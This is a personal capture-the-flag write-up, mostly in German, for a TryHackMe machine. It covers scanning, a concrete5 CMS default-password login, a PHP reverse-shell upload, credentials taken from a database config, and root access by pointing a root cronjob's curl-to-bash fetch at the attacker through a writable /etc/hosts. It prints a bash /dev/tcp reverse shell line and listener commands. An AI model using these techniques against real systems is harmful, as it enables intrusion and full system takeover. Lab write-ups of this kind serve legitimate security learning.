# Basics

10.10.119.145
# Scanning

PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN

PHP/5.5.9-1ubuntu4.29

# Enumeration

/app frei?
-> Blog unter /app/castle
-> concrete5 CMS
-> 2018 Elementalk Theme

Enum Scan für /app/castle
/updates              (Status: 301) [Size: 329] [--> http://10.10.119.145:85/app/castle/updates/]
/packages             (Status: 301) [Size: 330] [--> http://10.10.119.145:85/app/castle/packages/]
/application          (Status: 301) [Size: 333] [--> http://10.10.119.145:85/app/castle/application/]
/concrete             (Status: 301) [Size: 330] 

Output der Robots.txt
User-agent: *
Disallow: /application/attributes
Disallow: /application/authentication
Disallow: /application/bootstrap
Disallow: /application/config
Disallow: /application/controllers
Disallow: /application/elements
Disallow: /application/helpers
Disallow: /application/jobs
Disallow: /application/languages
Disallow: /application/mail
Disallow: /application/models
Disallow: /application/page_types
Disallow: /application/single_pages
Disallow: /application/tools
Disallow: /application/views
Disallow: /ccm/system/captcha/picture

Funktionierende CMS loginpage unter 
http://10.10.119.145:85/app/castle/index.php/login/authenticate/concrete
-> Standard Login tests mit 
admin:admin
admin:password
## Login erfolgreich auf das CMS

Walking the Application 
- User-Email gefunden admin@mingdom.thm

CMS Concrete5 v 8.5.2 
-> RCE vorhanden 

https://vulners.com/hackerone/H1:768322

-> Anpassen der "Allow File Types" und .php datein zulassen
-> hochladen einer PHP Rev Shell 
-> Listener via nc starten
-> Link der Rev Shell Klicken 
http://10.10.119.145:85/app/castle/application/files/6117/5854/6089/rev.php
## Rev Shell erhalten

Privilegien Eskalieren
-> Checken Capabilitys
-> Checken SUID
Checken Sudo 

Alles kein Erfolg. Nachlsesen in Writeup da keine idee zu weiterm Vorgehen. 

The first place I like to check for credentials as www-data is the web configuration file. You see, CMSs like concrete must have a DB to store all the data and users of the website. There has to be a configuration file that contains database credentials to allow the connection between the website and the DB.

Looking around, I end up finding the file in /var/www/html/app/castle/application/config/database.php:

           'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',

# Login auf Toad User Erfolgreich 
nun weiter zu mario user
->  Laden von LinPeas

-> Intressanter Key in der $Env variabel gefunden 
PWD_token=aWthVGVOVEFOdEVTCg==


Da ich hier nicht weitergekommen bin Befolgen von Guide 

 Discovering the cronjob[](https://jaxafed.github.io/posts/tryhackme-mkingdom/#discovering-the-cronjob)

Checking the running processes using `pspy`, we discover a `cronjob` run by the `root` user.

It fetches the script at `http://mkingdom.thm:85/app/castle/application/counter.sh` using `curl`, runs it by piping it to `bash`, and appends the output of it to the `/var/log/up.log` file.

Unfortunately, we are not able to overwrite or replace the `counter.sh` script at `/var/www/html/app/castle/application/counter.sh`.

### Abusing writable hosts file[](https://jaxafed.github.io/posts/tryhackme-mkingdom/#abusing-writable-hosts-file)

Also, running `linpeas`, we discover that we are able to write to the `/etc/hosts` file.

Cronjob uses the `mkingdom.thm` hostname to fetch the script to run, and currently it resolves to `127.0.1.1`.

Von hier an bin ich wieder weitergekommen. 

Wir nutzen jetzt hier den Cronjob aus der ein script von 'mkingdom.thm' lädt. Das Funktioniert da wir edit rechte auf die /etc/hosts haben und damit bestimmen können was der Host als "mkingdm.thm " kennt.

Da wir keinen Write Access auf das Script haben müssen wir jetzt noch anpassungen vornehmen.

```
mkdir -p app/castle/application/
echo "bash -i >& /dev/tcp/10.10.40.77/5555 0>&1" > /app/castle/application/counter.sh
```
hier legen wir das Verzeichniss welches im Scriupt benutzt wird an und legen dort unsere Payload "counter.sh" an. Als Payload nutzen wir hier eine einfache Bash Reverse shell

Dann starten wir unseren easy Webserver. WICHTIG auf Port 85#
```
python3 -m http.server 85
```

und nun Modifizieren wir die /etc/hosts auf dem Ziel 

```
echo '10.10.40.77 mkingdom.thm' > /etc/hosts
```

Jetzt können wir mir NetCat die Rev shell fangen und haben Root Access

```
rlwrap nc -lvnp 5555
```

Jetzt ist nur noch eine sache etwas Tricky, wir wissen wo die Root.txt und die User.txt ist bekommen aber trotzdem beim auslesen Probleme, da wir in den Verzeichnissen nicht auslesen können. Das beheben wir indem wir die Datein in /tmp schieben 

```
cp root.txt /tmp
cd /home/mario
cp user.txt /tmp
```

Und tadaa haben wir beide Flaggs.

# Learnings für mich 

## Linpeas Lernen 
## Seite besser erkunden ->  Login Page finden

## Privilegien Eskalieren üben
